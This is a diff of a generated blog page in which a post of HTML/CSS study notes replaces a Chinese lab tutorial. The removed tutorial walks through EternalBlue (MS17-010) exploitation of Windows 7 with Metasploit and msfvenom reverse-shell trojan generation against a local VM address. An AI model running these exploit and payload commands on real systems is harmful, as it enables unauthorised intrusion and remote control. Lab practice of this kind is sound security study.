@@ -4,8 +4,8 @@
 
 <head>
     <meta charset="utf-8">
-    <meta name="keywords" content="linux K-lili-永恒之蓝漏洞利用, DZ_Blog">
-    <meta name="description" content="利用一下win7的永恒之蓝漏洞">
+    <meta name="keywords" content="HTML+CSS前端学习笔记-9, DZ_Blog">
+    <meta name="description" content="一些属性的集合">
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
     <meta name="renderer" content="webkit|ie-stand|ie-comp">
@@ -18,7 +18,7 @@
     <!-- Global site tag (gtag.js) - Google Analytics -->
 
 
-    <title>linux K-lili-永恒之蓝漏洞利用 | DZ_Blog</title>
+    <title>HTML+CSS前端学习笔记-9 | DZ_Blog</title>
     <link rel="icon" type="image/png" href="/medias/favicon.png">
     
 
@@ -498,12 +498,12 @@
 
 
 
-<div class="bg-cover pd-header post-cover" style="background-image: url('https://img-blog.csdnimg.cn/5a683243b300442ea7b629584a0801eb.png')">
+<div class="bg-cover pd-header post-cover" style="background-image: url('https://img-blog.csdnimg.cn/85a7726f4fdc46a39c7d25ca78c829f8.png')">
     <div class="container" style="right: 0px;left: 0px;">
         <div class="row">
             <div class="col s12 m12 l12">
                 <div class="brand">
-                    <h1 class="description center-align post-title">linux K-lili-永恒之蓝漏洞利用</h1>
+                    <h1 class="description center-align post-title">HTML+CSS前端学习笔记-9</h1>
                 </div>
             </div>
         </div>
@@ -527,8 +527,8 @@
                     
                     <div class="article-tag">
                         
-                            <a href="/tags/kali/">
-                                <span class="chip bg-color">kali</span>
+                            <a href="/tags/CSS/">
+                                <span class="chip bg-color">CSS</span>
                             </a>
                         
                     </div>
@@ -539,8 +539,8 @@
                     <div class="post-cate">
                         <i class="fas fa-bookmark fa-fw icon-category"></i>
                         
-                            <a href="/categories/linux/" class="post-category">
-                                linux
+                            <a href="/categories/%E7%AC%94%E8%AE%B0/" class="post-category">
+                                笔记
                             </a>
                         
                     </div>
@@ -552,7 +552,7 @@
                 
                 <div class="post-date info-break-policy">
                     <i class="far fa-calendar-minus fa-fw"></i>发布日期:&nbsp;&nbsp;
-                    2023-03-28
+                    2023-04-03
                 </div>
                 
 
@@ -561,7 +561,7 @@
                 
                 <div class="info-break-policy">
                     <i class="far fa-file-word fa-fw"></i>文章字数:&nbsp;&nbsp;
-                    226
+                    239
                 </div>
                 
 
@@ -604,28 +604,72 @@
 
         <div class="card-content article-card-content">
             <div id="articleContent">
-                <h3 id="连接到目标主机"><a href="#连接到目标主机" class="headerlink" title="连接到目标主机"></a>连接到目标主机</h3><h4 id="启动msfconsole"><a href="#启动msfconsole" class="headerlink" title="启动msfconsole"></a>启动msfconsole</h4><p>进入终端后使用<code>sudo su</code>命令进入root权限，默认密码是<code>kali</code></p>
-<p>简单了解一下</p>
-<p><img src="https://img-blog.csdnimg.cn/8e69d233bed34687b3a19333cbcce515.png"></p>
-<p>使用永恒之蓝的漏洞模块<code>search ms17_010</code></p>
-<p><img src="https://img-blog.csdnimg.cn/eb7caeea61ca43e1a5584863e5658b7b.png"></p>
-<p>使用第一个攻击模块<code>use 0</code>或者<code>use exploit/windows/smb/ms17_010_eternalblue</code></p>
-<p><img src="https://img-blog.csdnimg.cn/9351da754c9246d282b6d86b4868713c.png"></p>
-<p>进行模块相关的设置<code>show options</code></p>
-<p><img src="https://img-blog.csdnimg.cn/07d06afdb1754febb8eda1469a349977.png"></p>
-<p>可以看到第一个的RHOSTS是必须要设置的而我们还没有设置</p>
-<p>使用<code>set RHOSTS 192.168.79.130</code></p>
-<p><img src="https://img-blog.csdnimg.cn/99db2c96776548ebae1e542304db0ba0.png"></p>
-<p>这是同局域网下虚拟机的ip地址</p>
-<p><img src="https://img-blog.csdnimg.cn/c0d1ca136de84c15b14f0018a1524dc4.png"></p>
-<p>用<code>run</code>进行攻击，等待获取目标电脑的权限，出现下图就是连接成功了</p>
-<p><img src="https://img-blog.csdnimg.cn/5ea591024ea34565b70a51185bddbcc1.png"></p>
-<h4 id="生成远控监听和木马文件"><a href="#生成远控监听和木马文件" class="headerlink" title="生成远控监听和木马文件"></a>生成远控监听和木马文件</h4><p>使用<code>msfvenom -p windows/x64/meterpreter/reverse_tcp lhost=192.168.79.130 lport=6666 -f exe -o demo6666.exe</code>命令在桌面生成远控监听文件</p>
-<p><img src="https://img-blog.csdnimg.cn/e1fbae8c2d32489f83f1336c2ec47096.png"></p>
-<p>设置必填项目打开监听</p>
-<p><img src="https://img-blog.csdnimg.cn/6401fb6dcb1342ec82f03ef0b219bb49.png"></p>
-<p><code>run</code>之后在目标电脑中运行监控文件就会得到权限</p>
-<p><img src="https://img-blog.csdnimg.cn/33b189c42c7f4b2098081ec270bf1f69.png"></p>
+                <h4 id="transition-过渡动画"><a href="#transition-过渡动画" class="headerlink" title="transition 过渡动画"></a>transition 过渡动画</h4><p>参数有两个，前面是<code>all</code>或者<code>单个属性(height,width,background-color,等)</code>表示全部能过滤的都过滤和只有宽度过滤</p>
+<p>用空格分开，后面是时间，单位秒，表示过滤消耗的时间</p>
+<p>需要配合hover的不同来实现，如下</p>
+<pre class="line-numbers language-html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>head</span><span class="token punctuation">></span></span>
+    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>style</span><span class="token punctuation">></span></span><span class="token style language-css">
+        <span class="token selector">div </span><span class="token punctuation">{</span>
+            <span class="token property">width</span><span class="token punctuation">:</span> <span class="token number">200</span>px<span class="token punctuation">;</span>
+            <span class="token property">height</span><span class="token punctuation">:</span> <span class="token number">200</span>px<span class="token punctuation">;</span>
+            <span class="token property">background-color</span><span class="token punctuation">:</span> red<span class="token punctuation">;</span>
+
+            <span class="token property">transition</span><span class="token punctuation">:</span> all <span class="token number">1</span>s<span class="token punctuation">;</span>
+        <span class="token punctuation">}</span>
+
+        <span class="token selector">div<span class="token pseudo-class">:hover</span> </span><span class="token punctuation">{</span>
+            <span class="token property">width</span><span class="token punctuation">:</span> <span class="token number">800</span>px<span class="token punctuation">;</span>
+            <span class="token property">height</span><span class="token punctuation">:</span> <span class="token number">300</span>px<span class="token punctuation">;</span>
+            <span class="token property">background-color</span><span class="token punctuation">:</span> blue<span class="token punctuation">;</span>
+        <span class="token punctuation">}</span>
+    </span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>style</span><span class="token punctuation">></span></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>head</span><span class="token punctuation">></span></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">></span></span>
+    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">></span></span>
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<h4 id="有语义的布局标签"><a href="#有语义的布局标签" class="headerlink" title="有语义的布局标签"></a>有语义的布局标签</h4><table>
+<thead>
+<tr>
+<th align="center">标签名</th>
+<th align="center">语义</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="center">header</td>
+<td align="center">网页头部</td>
+</tr>
+<tr>
+<td align="center">nav</td>
+<td align="center">网页导航</td>
+</tr>
+<tr>
+<td align="center">footer</td>
+<td align="center">网页底部</td>
+</tr>
+<tr>
+<td align="center">aside</td>
+<td align="center">网页侧边栏</td>
+</tr>
+<tr>
+<td align="center">section</td>
+<td align="center">网页区块</td>
+</tr>
+<tr>
+<td align="center">article</td>
+<td align="center">网页文章</td>
+</tr>
+</tbody></table>
+<h4 id="ico-图标设置"><a href="#ico-图标设置" class="headerlink" title="ico-图标设置"></a>ico-图标设置</h4><pre class="line-numbers language-css"><code class="language-css">&lt;link rel=<span class="token string">"shortrcut icon"</span> href=<span class="token string">"ico图标路径"</span> type=<span class="token string">"image/x-icon"</span>>
+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<h4 id="版心"><a href="#版心" class="headerlink" title="版心"></a>版心</h4><p>将页面的主题内容约束在网页中间，是不同大小的屏幕都能看到主题内容</p>
+<pre class="line-numbers language-css"><code class="language-css"><span class="token selector"><span class="token class">.container</span> </span><span class="token punctuation">{</span>
+    <span class="token property">width</span><span class="token punctuation">:</span> <span class="token number">1245</span>px<span class="token punctuation">;</span>
+    <span class="token property">margin</span><span class="token punctuation">:</span> <span class="token number">0</span> auto<span class="token punctuation">;</span>
+    &lt;!-- 水平居中 -->
+<span class="token punctuation">}</span>
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p>除此之外常见的版心类名还有：<code>container</code>、<code>wrapper</code>、<code>w</code>等</p>
 
                 
             </div>
@@ -652,7 +696,7 @@
                     </i>
                 </span>
                 <span class="reprint-info">
-                    <a href="https://dzbash.github.io/2023/03/28/linux-k-lili-yong-heng-zhi-lan-lou-dong-li-yong/">https://dzbash.github.io/2023/03/28/linux-k-lili-yong-heng-zhi-lan-lou-dong-li-yong/</a>
+                    <a href="https://dzbash.github.io/2023/04/03/html-css-qian-duan-xue-xi-bi-ji-9/">https://dzbash.github.io/2023/04/03/html-css-qian-duan-xue-xi-bi-ji-9/</a>
                 </span>
             </div>
             <div class="reprint__notice">
@@ -690,8 +734,8 @@
                     
                         <div class="article-tag">
                             
-                                <a href="/tags/kali/">
-                                    <span class="chip bg-color">kali</span>
+                                <a href="/tags/CSS/">
+                                    <span class="chip bg-color">CSS</span>
                                 </a>
                             
                         </div>
@@ -1109,9 +1153,10 @@
 <article id="prenext-posts" class="prev-next articles">
     <div class="row article-row">
         
-        <div class="article col s12 m6" data-aos="fade-up">
+        <div class="article col s12 m6" data-aos="fade-up" data-aos="fade-up">
             <div class="article-badge left-badge text-color">
-                <i class="fas fa-chevron-left"></i>&nbsp;上一篇</div>
+                <i class="far fa-dot-circle"></i>&nbsp;本篇
+            </div>
             <div class="card">
                 <a href="/2023/04/03/html-css-qian-duan-xue-xi-bi-ji-9/">
                     <div class="card-image">
@@ -1129,9 +1174,9 @@
                         
                     </div>
                     <div class="publish-info">
-                        <span class="publish-date">
-                            <i class="far fa-clock fa-fw icon-date"></i>2023-04-03
-                        </span>
+                            <span class="publish-date">
+                                <i class="far fa-clock fa-fw icon-date"></i>2023-04-03
+                            </span>
                         <span class="publish-author">
                             
                             <i class="fas fa-bookmark fa-fw icon-category"></i>
@@ -1144,6 +1189,7 @@
                         </span>
                     </div>
                 </div>
+
                 
                 <div class="card-action article-tags">
                     
@@ -1162,31 +1208,31 @@
                 下一篇&nbsp;<i class="fas fa-chevron-right"></i>
             </div>
             <div class="card">
-                <a href="/2023/02/01/chu-shi-javascript/">
+                <a href="/2023/03/28/linux-k-lili-yong-heng-zhi-lan-lou-dong-li-yong/">
                     <div class="card-image">
                         
                         
-                        <img src="https://img-blog.csdnimg.cn/7d06f5c82dd44570bd9395f0ee02a0d8.png" class="responsive-img" alt="初识JavaScript">
+                        <img src="https://img-blog.csdnimg.cn/5a683243b300442ea7b629584a0801eb.png" class="responsive-img" alt="linux K-lili-永恒之蓝漏洞利用">
                         
-                        <span class="card-title">初识JavaScript</span>
+                        <span class="card-title">linux K-lili-永恒之蓝漏洞利用</span>
                     </div>
                 </a>
                 <div class="card-content article-content">
                     <div class="summary block-with-text">
                         
-                            先了解一下js的基础知识
+                            利用一下win7的永恒之蓝漏洞
                         
                     </div>
                     <div class="publish-info">
                             <span class="publish-date">
-                                <i class="far fa-clock fa-fw icon-date"></i>2023-02-01
+                                <i class="far fa-clock fa-fw icon-date"></i>2023-03-28
                             </span>
                         <span class="publish-author">
                             
                             <i class="fas fa-bookmark fa-fw icon-category"></i>
                             
-                            <a href="/categories/%E7%AC%94%E8%AE%B0/" class="post-category">
-                                    笔记
+                            <a href="/categories/linux/" class="post-category">
+                                    linux
                                 </a>
                             
                             
@@ -1196,8 +1242,8 @@
                 
                 <div class="card-action article-tags">
                     
-                    <a href="/tags/js/">
-                        <span class="chip bg-color">js</span>
+                    <a href="/tags/kali/">
+                        <span class="chip bg-color">kali</span>
                     </a>
                     
                 </div>
